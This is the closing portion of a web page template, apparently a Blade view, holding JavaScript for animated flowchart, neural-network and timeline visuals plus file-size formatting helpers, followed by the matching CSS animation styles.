    // Encrypted file drop handler removed - functionality available on dedicated encryption page
    
    function showFileInfo(file, infoId, nameId, sizeId, statusId) {
        document.getElementById(infoId).classList.remove('hidden');
        document.getElementById(nameId).textContent = file.name;
        document.getElementById(sizeId).textContent = formatFileSize(file.size);
        document.getElementById(statusId).innerHTML = '<i class="fas fa-check-circle"></i> Ready';
    }
      function formatFileSize(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }    // All encryption functionality removed - available on dedicated encryption page
    
    // ===============================
    // INTERACTIVE FLOWCHART FUNCTIONALITY
    // ===============================
    
    // Flowchart Mode Switching
    function activateFlowchartMode(mode) {
        // Hide all flowchart modes
        document.querySelectorAll('.flowchart-mode').forEach(section => {
            section.classList.add('hidden');
        });
        
        // Show selected mode
        const targetSection = document.getElementById(`${mode}-flowchart`);
        if (targetSection) {
            targetSection.classList.remove('hidden');
            
            // Add activation animation
            targetSection.style.opacity = '0';
            targetSection.style.transform = 'translateY(20px)';
            setTimeout(() => {
                targetSection.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
                targetSection.style.opacity = '1';
                targetSection.style.transform = 'translateY(0)';
            }, 100);
        }
        
        // Update active button
        document.querySelectorAll('.flowchart-mode-btn').forEach(btn => {
            btn.classList.remove('bg-emerald-600/40', 'bg-cyan-600/40', 'bg-purple-600/40');
            btn.classList.add('bg-emerald-600/20', 'bg-cyan-600/20', 'bg-purple-600/20');
        });
        
        // Highlight active button
        event.target.classList.add('ring-2', 'ring-emerald-400/50');
        setTimeout(() => {
            event.target.classList.remove('ring-2', 'ring-emerald-400/50');
        }, 1000);
    }
    
    // Initialize Neural Network Animation
    function initializeNeuralNetwork() {
        // Animate neural connections
        const connections = document.querySelectorAll('.neural-connection');
        connections.forEach((connection, index) => {
            setTimeout(() => {
                connection.classList.add('animate-pulse');
            }, index * 200);
        });
        
        // Pulse effect for active nodes
        const nodes = document.querySelectorAll('.neural-node');
        nodes.forEach(node => {
            node.addEventListener('mouseenter', function() {
                this.querySelector('.data-stream').style.animation = 'dataFlow 2s infinite linear';
            });
        });
    }
    
    // Initialize Timeline Animations
    function initializeTimeline() {
        const timelineItems = document.querySelectorAll('.timeline-item');
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateX(0)';
                }
            });
        });
        
        timelineItems.forEach(item => {
            item.style.opacity = '0';
            item.style.transform = 'translateX(-50px)';
            item.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
            observer.observe(item);
        });
    }
    
    // Interactive Neural Network Effects
    document.addEventListener('DOMContentLoaded', function() {
        // Initialize neural network on page load
        setTimeout(() => {
            activateFlowchartMode('neural');
            initializeNeuralNetwork();
            initializeTimeline();
        }, 500);
        
        // Add hover effects to neural connections
        document.querySelectorAll('.neural-connection').forEach(connection => {
            connection.addEventListener('mouseenter', function() {
                const indicator = this.querySelector('.connection-indicator');
                if (indicator) {
                    indicator.style.animation = 'pulse 1s infinite';
                }
            });
            
            connection.addEventListener('mouseleave', function() {
                const indicator = this.querySelector('.connection-indicator');
                if (indicator) {
                    indicator.style.animation = '';
                }
            });
        });
        
        // Animate architecture components
        document.querySelectorAll('.architecture-component').forEach((component, index) => {
            component.addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-5px) scale(1.02)';
                this.style.boxShadow = '0 10px 25px rgba(0, 255, 255, 0.2)';
            });
            
            component.addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0) scale(1)';
                this.style.boxShadow = '';
            });
        });
        
        // Particle system animation
        const particles = document.querySelectorAll('.particle');
        particles.forEach((particle, index) => {
            particle.style.animationDelay = `${index * 0.5}s`;
        });
    });
</script>

<style>
/* ===============================
   INTERACTIVE FLOWCHART STYLES
   =============================== */

/* Particle System */
.particle-system {
    position: relative;
    width: 100%;
    height: 100%;
}

.particle {
    position: absolute;
    width: 4px;
    height: 4px;
    background: linear-gradient(45deg, #10b981, #06b6d4);
    border-radius: 50%;
    animation: particleFloat 6s infinite ease-in-out;
}

.particle-1 { top: 10%; left: 15%; animation-delay: 0s; }
.particle-2 { top: 30%; right: 20%; animation-delay: 1.2s; }
.particle-3 { bottom: 40%; left: 25%; animation-delay: 2.4s; }
.particle-4 { top: 60%; right: 15%; animation-delay: 3.6s; }
.particle-5 { bottom: 20%; left: 60%; animation-delay: 4.8s; }

@keyframes particleFloat {
    0%, 100% { transform: translateY(0px) scale(1); opacity: 0.7; }
    25% { transform: translateY(-20px) scale(1.1); opacity: 1; }
    50% { transform: translateY(-10px) scale(0.9); opacity: 0.8; }
    75% { transform: translateY(-30px) scale(1.05); opacity: 0.9; }
}

/* Neural Network Grid */
.neural-grid {
    background-image: 
        linear-gradient(rgba(16, 185, 129, 0.1) 1px, transparent 1px),
        linear-gradient(90deg, rgba(16, 185, 129, 0.1) 1px, transparent 1px);
    background-size: 50px 50px;
    width: 100%;
    height: 100%;
    animation: gridFlow 20s infinite linear;
}

@keyframes gridFlow {
    0% { transform: translate(0, 0); }
    100% { transform: translate(50px, 50px); }
}

/* NEXUS Core Animation */
@keyframes pulse-glow {
    0%, 100% { 
        box-shadow: 0 0 20px rgba(16, 185, 129, 0.5), 0 0 40px rgba(6, 182, 212, 0.3); 
    }
    50% { 
        box-shadow: 0 0 30px rgba(16, 185, 129, 0.8), 0 0 60px rgba(6, 182, 212, 0.6); 
    }
}

@keyframes spin-slow {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

@keyframes reverse-spin {
    from { transform: rotate(360deg); }
    to { transform: rotate(0deg); }
}

.animate-pulse-glow { animation: pulse-glow 3s ease-in-out infinite; }
.animate-spin-slow { animation: spin-slow 10s linear infinite; }
.animate-reverse-spin { animation: reverse-spin 15s linear infinite; }

/* Neural Connections */
.neural-connection {
    position: relative;
    padding: 12px;
    border-radius: 8px;
    transition: all 0.3s ease;
    background: rgba(31, 41, 55, 0.5);
    border: 1px solid rgba(75, 85, 99, 0.3);
}

.neural-connection:hover {
    background: rgba(31, 41, 55, 0.8);
    border-color: rgba(16, 185, 129, 0.5);
    transform: translateX(5px);
}

.connection-indicator {
    position: absolute;
    left: -6px;
    top: 50%;
    transform: translateY(-50%);
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: rgba(75, 85, 99, 0.5);
    border: 2px solid rgba(16, 185, 129, 0.3);
}

.connection-indicator.active {
    background: #10b981;
    border-color: #10b981;
    box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
    animation: pulse 2s infinite;
}

.connection-indicator.pending {
    background: rgba(251, 191, 36, 0.3);
    border-color: #fbbf24;
    animation: blink 1.5s infinite;
}

@keyframes blink {
    0%, 50% { opacity: 1; }
    51%, 100% { opacity: 0.3; }
}

/* Data Streams */
.data-stream {
    position: absolute;
    width: 2px;
    height: 20px;
    background: linear-gradient(to bottom, transparent, #10b981, transparent);
    opacity: 0.7;
}

.stream-1 {
    top: 20%;
    left: 10%;
    animation: dataFlow 3s infinite linear;
}

.stream-2 {
    top: 50%;
    right: 15%;
    animation: dataFlow 4s infinite linear reverse;
}

.stream-3 {
    bottom: 30%;
    left: 30%;
    animation: dataFlow 2.5s infinite linear;
}

@keyframes dataFlow {
    0% { transform: translateY(-100px); opacity: 0; }
    10% { opacity: 0.7; }
    90% { opacity: 0.7; }
    100% { transform: translateY(100px); opacity: 0; }
}

/* Connection Lines */
.connection-line {
    position: absolute;
    width: 2px;
    height: 100px;
    background: linear-gradient(to bottom, transparent, rgba(16, 185, 129, 0.5), transparent);
    top: -50px;
    left: 50%;
    transform: translateX(-50%);
    opacity: 0.6;
}

.connection-to-center::before {
    content: '';
    position: absolute;
    top: -20px;
    left: 50%;
    transform: translateX(-50%);
    width: 0;
    height: 0;
    border-left: 5px solid transparent;
    border-right: 5px solid transparent;
    border-bottom: 10px solid rgba(16, 185, 129, 0.5);
}

/* Quantum Field Effects */
.quantum-field {
    background: radial-gradient(circle at 30% 20%, rgba(147, 51, 234, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 70% 80%, rgba(236, 72, 153, 0.1) 0%, transparent 50%);
    width: 100%;
    height: 100%;
    animation: quantumShift 8s infinite ease-in-out;
}

@keyframes quantumShift {
    0%, 100% { transform: scale(1) rotate(0deg); }
    50% { transform: scale(1.05) rotate(180deg); }
}

/* Game Particles */
.game-particles {
    background: 
        radial-gradient(circle at 20% 30%, rgba(6, 182, 212, 0.1) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(20, 184, 166, 0.1) 0%, transparent 40%),
        radial-gradient(circle at 50% 50%, rgba(16, 185, 129, 0.05) 0%, transparent 60%);
    width: 100%;
    height: 100%;
    animation: gameShimmer 6s infinite ease-in-out;
}

@keyframes gameShimmer {
    0%, 100% { opacity: 0.3; transform: scale(1); }
    50% { opacity: 0.6; transform: scale(1.02); }
}

/* Progress Bars Animation */
@keyframes pulse-bright {
    0%, 100% { box-shadow: 0 0 5px rgba(16, 185, 129, 0.5); }
    50% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.8); }
}

.animate-pulse-bright { animation: pulse-bright 2s ease-in-out infinite; }

/* Timeline Styles */
.timeline-node {
    position: relative;
    z-index: 10;
}

.timeline-item {
    position: relative;
}

/* Architecture Components */
.architecture-component {
    transition: all 0.3s ease;
}

.architecture-component:hover {
    transform: translateY(-5px) scale(1.02);
    box-shadow: 0 10px 25px rgba(0, 255, 255, 0.2);
}

/* Metric Cards */
.metric-card {
    transition: all 0.3s ease;
}

.metric-card:hover {
    transform: scale(1.05);
    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
}

/* Neural Stats */
.neural-stat {
    transition: all 0.3s ease;
}

.neural-stat:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 20px rgba(16, 185, 129, 0.2);
}

/* Responsive Design */
@media (max-width: 768px) {
    .neural-grid { background-size: 30px 30px; }
    .particle { width: 3px; height: 3px; }
    .connection-line { height: 60px; top: -30px; }
}

/* Dark mode enhancements */
.flowchart-mode {
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.1);
}

/* Interactive hover states */
.neural-node:hover .data-stream {
    animation-duration: 1s !important;
}

.neural-node:hover .connection-indicator {
    transform: translateY(-50%) scale(1.2);
}

/* Smooth transitions */
* {
    transition: transform 0.3s ease, opacity 0.3s ease, box-shadow 0.3s ease;
}
</style>
@endsection
